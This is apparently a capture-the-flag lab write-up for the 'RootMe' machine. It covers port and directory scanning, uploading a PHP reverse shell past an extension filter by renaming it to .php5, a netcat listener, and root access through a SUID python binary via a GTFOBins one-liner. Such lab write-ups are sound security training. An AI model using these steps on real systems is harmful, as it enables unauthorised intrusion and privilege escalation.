
## **RootMe**

```
nmap -sC -sV --vv <IP>
```

```
gobuster dir -u <url> -w <wordlist>
```

We found  /uploads and /panel

/Panel is hidden directory

##### **User.txt**

Let’s search in uploads file on the web

Panel has file upload option so we can use pentest monkey reverse shell

Change ip to yours in php reverse shell of pentest monkey and run netcat on your system

```
nc -lvnp <port>
```

Upload php file in it

We found that we are not able to enter php file directly

Change extension from php to php5

Now upload again

We were able to bypass that

Let’s go to /uploads folder as it is where we uploaded our file

Click on reverse shell over there

We got user access

```
find / -name user.txt
```

We found file inside /var/www/user.txt

##### **Privilege Escalation**

```
find / -user root -perm /4000 2>/dev/null
```

4000 -> a permission for SUID

2>/dev/null à Used to scrap results of permission denied ones

We can do something about

/usr/bin/python

Apart from /python one others are mostly there

Let’s go to gtfobins

Search python and click on suid

[https://gtfobins.github.io/gtfobins/python/#suid](https://gtfobins.github.io/gtfobins/python/#suid)

```
./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```


/usr/bin is where the python is there

Now we are root and we can cat out root flag